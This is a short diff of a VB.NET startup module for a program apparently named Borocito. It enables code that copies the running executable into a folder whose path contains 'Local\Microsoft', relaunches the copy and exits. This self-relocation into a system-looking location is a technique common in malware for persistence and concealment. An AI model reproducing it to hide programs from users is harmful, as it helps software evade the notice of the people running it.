@@ -174,12 +174,12 @@ Module StartUp
         Try
             If Application.StartupPath.Contains("Local\Microsoft") = False Then
                 AddToLog("RunFromLocation@StartUp", "Running from " & Application.ExecutablePath, True)
-                'If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.exe") Then
-                '    My.Computer.FileSystem.DeleteFile(DIRCommons & "\Borocito.exe")
-                'End If
-                'My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRCommons & "\Borocito.exe")
-                'Process.Start(DIRCommons & "\Borocito.exe", parameters)
-                'Stopit()
+                If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.exe") Then
+                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\Borocito.exe")
+                End If
+                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRCommons & "\Borocito.exe")
+                Process.Start(DIRCommons & "\Borocito.exe", parameters)
+                Stopit()
             End If
         Catch ex As Exception
             AddToLog("RunFromLocation@StartUp", "Error: " & ex.Message, True)
